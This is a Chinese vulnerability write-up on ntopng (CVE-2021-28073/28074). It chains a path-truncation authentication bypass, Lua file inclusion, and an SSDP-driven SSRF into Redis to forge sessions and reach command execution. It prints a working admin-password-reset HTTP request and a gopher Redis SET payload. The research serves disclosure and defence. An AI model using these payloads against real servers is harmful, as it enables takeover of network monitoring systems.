**作者：Ricter Z@360高级攻防实验室  
原文链接：<http://noahblog.360.cn/ntopng-multiple-vulnerabilities/>**

### 0x00. TL;DR

ntopng 是一套开源的网络流量监控工具，提供基于 Web 界面的实时网络流量监控。支持跨平台，包括 Windows、Linux 以及
MacOS。ntopng 使用 C++ 语言开发，其绝大部分 Web 逻辑使用 lua 开发。

在针对 ntopng 的源码进行审计的过程中，笔者发现了 ntopng 存在多个漏洞，包括一个权限绕过漏洞、一个 SSRF
漏洞和多个其他安全问题，接着组合利用这些问题成功实现了部分版本的命令执行利用和管理员 Cookie 伪造。

比较有趣的是，利用的过程涉及到 SSDP 协议、gopher scheme 和奇偶数，还有极佳的运气成分。ntopng 已经针对这些漏洞放出补丁，并在
4.2 版本进行修复。涉及漏洞的 CVE 如下：

  * CVE-2021-28073
  * CVE-2021-28074

### 0x01. 部分权限绕过 (全版本)

ntopng 的 Web 界面由 Lua 开发，对于 HTTP 请求的处理、认证相关的逻辑由后端 C++ 负责，文件为
`HTTPserver.cpp`。对于一个 HTTP 请求来说，ntopng 的主要处理逻辑代码都在 `handle_lua_request` 函数中。其
HTTP 处理逻辑流程如下：

  1. 检测是不是某些特殊路径，如果是直接返回相关逻辑结束函数；
  2. 检测是不是白名单路径，如果是则储存在 whitelisted 变量中；
  3. 检测是否是静态资源，通过判断路径最后的扩展名，如果不是则进入认证逻辑，认证不通过结束函数；
  4. 检测是否路径以某些特殊路径开头，如果是则调用 Lua 解释器，逻辑交由 Lua 层；
  5. 以上全部通过则判断为静态文件，函数返回，交由 mongoose 处理静态文件。

针对一个非白名单内的 lua 文件，是无法在通过认证之前到达的，因为无法通过判断是否是静态文件的相关逻辑。同时为了使我们传入的路径进入调用
LuaEngine::handle_script_request 我们传入的路径需要以 `/lua/` 或者 `/plugins/`
开头，以静态文件扩展名结尾，比如 `.css` 或者 `.js`。

    
    
    // HTTPserver.cpp
    if(!isStaticResourceUrl(request_info, len)) {
        ...
    }
    
    if((strncmp(request_info->uri, "/lua/", 5) == 0)
     || (strcmp(request_info->uri, "/metrics") == 0)
     || (strncmp(request_info->uri, "/plugins/", 9) == 0)
     || (strcmp(request_info->uri, "/") == 0)) {
     ...
    12345678910

进入 if 语句后，ntopng 声明了一个 **大小为 255 的字符串数组** 来储存用户请求的文件路径。并针对以非 `.lua`
扩展名结尾的路径后补充了 `.lua`，接着调用 stat 函数判断此路径是否存在。如果存在则调用
`LuaEngine::handle_script_request` 来进行处理。

    
    
    // HTTPserver.cpp
    /* Lua Script */
    char path[255] = { 0 }, uri[2048];
    struct stat buf;
    bool found;
    
    ...
    if(strlen(path) > 4 && strncmp(&path[strlen(path) - 4], ".lua", 4))
        snprintf(&path[strlen(path)], sizeof(path) - strlen(path) - 1, "%s", 
        (char*)".lua");
    
    ntop->fixPath(path);
    found = ((stat(path, &buf) == 0) && (S_ISREG(buf.st_mode))) ? true : false;
    
    if(found) {
        ...
        l = new LuaEngine(NULL);
        ...
        l->handle_script_request(conn, request_info, path, &attack_attempt, username,
                                 group, csrf, localuser);
    1234567891011121314151617181920

ntopng 调用 snprintf 将用户请求的 URI 写入到 path 数组中，而 snprintf 会在字符串结尾添加 `\0`。由于 path
数组长度有限，即使用户传入超过 255 个字符的路径，也只会写入前 254 个字符，我们可以通过填充 `./` 来构造一个长度超过 255
但是合法的路径，并利用长度限制来截断后面的 .css.lua，即可绕过 ntopng 的认证以访问部分 Lua 文件。

目前有两个问题，一个是为什么只能用 `./` 填充，另外一个是为什么说是“部分 Lua 文件”。

第一个问题，在 `thrid-party/mongoose/mongoose.c` 中，进行路径处理之前会调用下面的函数去除重复的 `/`以及
`.`，导致我们只能用 `./` 来填充。

    
    
    void remove_double_dots_and_double_slashes(char *s) {
        char *p = s;
    
        while (*s != '\0') {
            *p++ = *s++;
            if (s[-1] == '/' || s[-1] == '\\') {
                // Skip all following slashes, backslashes and double-dots
                while (s[0] != '\0') {
                    if (s[0] == '/' || s[0] == '\\') {
                        s++;
                    } else if (s[0] == '.' && s[1] == '.') {
                        s += 2;
                    } else {
                        break;
                    }
                }
            }
        }
        *p = '\0';
    }
    1234567891011121314151617181920

说部分 Lua 文件的原因为，由于我们只能利用两个字符 `./`
来进行路径填充，。那么针对前缀长度为偶数的路径，我们只能访问路径长度为偶数的路径，反之亦然。因为一个偶数加一个偶数要想成为偶数必然需要再加一个偶数。也就是说，我们需要：

    
    
    len("/path/to/ntopng/lua/") + len("./") * padding + len("path/to/file") = 255 - 1

### 0x02. 全局权限绕过 (版本 4.1.x-4.3.x)

其实大多数 ntopng 的安装路径都是偶数（/usr/share/ntopng/scripts/lua/），那么我们需要一个合适的 gadgets
来使我们执行任意 lua 文件。通过对 lua 文件的审计，我发现 `modules/widgets_utils.lua`内存在一个合适的 gadgets：

    
    
    // modules/widgets_utils.lua
    function widgets_utils.generate_response(widget, params)
       local ds = datasources_utils.get(widget.ds_hash)
       local dirs = ntop.getDirs()
       package.path = dirs.installdir .. "/scripts/lua/datasources/?.lua;" .. package.path
    
       -- Remove trailer .lua from the origin
       local origin = ds.origin:gsub("%.lua", "")
    
       -- io.write("Executing "..origin..".lua\n")
       --tprint(widget)
    
       -- Call the origin to return
       local response = require(origin)
    1234567891011121314

调用入口在 `widgets/widget.lua`，很幸运，这个文件名长度为偶数。通过阅读代码逻辑可知，我们需要在`edit_widgets.lua`
创建一个 widget，而创建 widget 有需要存在一个 datasource，在 `edit_datasources.lua`
创建。而这两个文件的文件名长度全部为偶数，所以我们可以利用请求这几个文件，从而实现任意文件包含的操作，从而绕过 ntopng 的认证。

### 0x03. Admin 密码重置利用 (版本 2.x)

利用 0x01 的认证绕过，请求 `admin/password_reset.lua` 即可更改管理员的密码。

    
    
    GET /lua/.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f
    .%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.
    %2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%
    2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2
    f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f
    .%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2fadmin/password_reset.lua.css?confirm_new_
    password=123&new_password=123&old_password=0&username=admin HTTP/1.1
    Host: 127.0.0.1:3000
    Cookie: user=admin
    Connection: close
    12345678910

### 0x04. 利用主机发现功能伪造 Session (版本 4.1.x-4.3.x)

ntopng 的主机发现功能利用了 SSDP（Simple Service Discovery Protocol）协议去发现内网中的设备。

SSDP 协议进行主机发现的流程如下所示：

    
    
    +----------------------+
    |      SSDP Client     +<--------+
    +-----------+----------+         |
                |                    |
            M-SEARCH          HTTP/1.1 200 OK
                v                    |
    +-----------+----------+         |
    | 239.255.255.250:1900 |         |
    +---+--------------+---+         |
        |              |             |
        v              v             |
    +---+-----+  +-----+---+         |
    | DEVICES |  | DEVICES |         |
    +---+-----+  +-----+---+         |
        |              |             |
        +--------------+-------------+
    12345678910111213141516

SSDP 协议在 UDP 层传输，协议格式基于 HTTPU（在 UDP 端口上传输 HTTP 协议）。SSDP
客户端向多播地址239.255.255.250 的 1900 端口发送 M-SEARCH 的请求，局域网中加入此多播地址的设备接收到请求后，向客户端回复一个
`HTTP/1.1 200 OK`，在 HTTP Headers 里有与设备相关的信息。其中存在一个 Location 字段，一般指向设备的描述文件。

    
    
    // modules/discover_utils.lua
    function discover.discover2table(interface_name, recache)
        ...
        local ssdp = interface.discoverHosts(3)
        ...
        ssdp = analyzeSSDP(ssdp)
        ...
    
    local function analyzeSSDP(ssdp)
       local rsp = {}
    
       for url,host in pairs(ssdp) do
          local hresp = ntop.httpGet(url, "", "", 3 --[[ seconds ]])
          ...
    1234567891011121314

在 discover_utils.lua 中，Lua 会调用 `discoverHosts` 函数获取 SSDP
发现的设备信息，然后在analyzeSSDP 函数中请求 Location 头所指向的 URL。那么这里显然存在一个 SSRF
漏洞。`ntop.httpGet`最终调用到的方法为 `Utils::httpGetPost`，而这个方法又使用了 cURL 进行请求。

    
    
    // Utils.cpp
    bool Utils::httpGetPost(lua_State* vm, char *url, char *username,
                char *password, int timeout,
                bool return_content,
                bool use_cookie_authentication,
                HTTPTranferStats *stats, const char *form_data,
                char *write_fname, bool follow_redirects, int ip_version) {
      CURL *curl;
      FILE *out_f = NULL;
      bool ret = true;
    
      curl = curl_easy_init();
    123456789101112

众所周知，cURL 是支持 `gopher://` 协议的。ntopng 使用 Redis 储存 Session 的相关信息，那么利用SSRF 攻击本地的
Redis 即可设置 Session，最终实现认证绕过。

`discover.discover2table` 的调用入口在
discover.lua，也是一个偶数长度的文件名。于是通过请求此文件触发主机发现功能，同时启动一个 SSDP Server 去回复 ntopng 发出的
M-SEARCH 请求，并将 Location设置为如下 payload：

    
    
    gopher://127.0.0.1:6379/_SET%20sessions.ntop%20%22admin|...%22%0d%0aQUIT%0d%0a

最终通过设置 Cookie 为 `session=ntop` 来通过认证。

### 0x05. 利用主机发现功能实现 RCE (版本 3.8-4.0)

原理同 0x04，利用点在 assistant_test.lua 中，需要设置 `ntopng.prefs.telegram_chat_id` 以及
`ntopng.prefs.telegram_bot_token`，利用 SSRF 写入 Redis 即可。

    
    
    local function send_text_telegram(text) 
      local chat_id, bot_token = ntop.getCache("ntopng.prefs.telegram_chat_id"), 
      ntop.getCache("ntopng.prefs.telegram_bot_token")
    
        if( string.len(text) >= 4096 ) then 
          text = string.sub( text, 1, 4096 )
        end
    
        if (bot_token and chat_id) and (bot_token ~= "") and (chat_id ~= "") then 
          os.execute("curl -X POST  https://api.telegram.org/bot"..bot_token..
          "/sendMessage -d chat_id="..chat_id.." -d text=\" " ..text.." \" ")
          return 0
    
        else
          return 1
        end
    end
    1234567891011121314151617

### 0x06. 利用主机发现功能实现 RCE (版本 3.2-3.8)

原理同 0x04，利用点在 modules/alert_utils.lua 中，需要在 Redis 里设置合适的 threshold。

    
    
    local function entity_threshold_crossed(granularity, old_table, new_table, threshold)
       local rc
       local threshold_info = table.clone(threshold)
    
       if old_table and new_table then -- meaningful checks require both new and old tables
          ..
          -- This is where magic happens: load() evaluates the string
          local what = "val = "..threshold.metric.."(old, new, duration); if(val ".. op .. " " ..
           threshold.edge .. ") then return(true) else return(false) end"
    
          local f = load(what)
          ...
    12345678910111213

### 0x07. 在云主机上进行利用

SSDP 通常是在局域网内进行数据传输的，看似不可能针对公网的 ntopng 进行攻击。但是我们根据 0x04 中所提及到的 SSDP 的运作方式可知，当
ntopng 发送 M-SEARCH 请求后，在 3s 内向其隐式绑定的 UDP 端口发送数据即可使 ntopng 成功触发漏洞。

    
    
    // modules/discover_utils.lua: local ssdp = interface.discoverHosts(3) <- timeout
    if(timeout < 1) timeout = 1;
    
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    ..
    
    while(select(udp_sock + 1, &fdset, NULL, NULL, &tv) > 0) {
        struct sockaddr_in from = { 0 };
        socklen_t s = sizeof(from);
        char ipbuf[32];
        int len = recvfrom(udp_sock, (char*)msg, sizeof(msg), 0, (sockaddr*)&from, &s);
        ..
    12345678910111213

针对云主机，如 Google Compute Engine、腾讯云等，其实例的公网 IP 实际上是利用 NAT
来进行与外部网络的通信的。即使绑定在云主机的内网 IP 地址上（如 10.x.x.x），在流量经过 NAT 时，dst IP 也会被替换为云主机实例的内网
IP 地址，也就是说，我们一旦知道其与 SSDP 多播地址 239.255.255.250 通信的 UDP
端口，即使不在同一个局域网内，也可以使之接收到我们的 payload，以触发漏洞。

针对 0x04，我们可以利用 rest/v1/get/flow/active.lua 来获取当前 ntopng 服务器与 239.255.255.250
通信的端口，由于这个路径长度为奇数，所以我们需要利用 0x02 中提及到的任意 lua 文件包含来进行利用。

同时，由于 UDP 通信的过程中此端口是隐式绑定的，且并没有进行来源验证，所以一旦获取到这个端口号，则可以向此端口发送 SSDP 数据包，以混淆真实的
SSDP 回复。需要注意的是，需要在触发主机功能的窗口期内向此端口发送数据，所以整个攻击流程如下：

  1. 触发主机发现功能；
  2. 循环请求 rest/v1/get/flow/active.lua 以获取端口；
  3. 再次触发主机发现功能；
  4. 向目标从第 2 步获取到的 UDP 端口发送 payload；
  5. 尝试利用 Cookie 进行登录以绕过认证。

针对 0x05，我们可以利用 get_flows_data.lua 来获取相关的 UDP 端口，原理不再赘述。

### 0x07. Conclusion

为什么出问题的文件名长度都是偶数啊.jpg

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1599/>

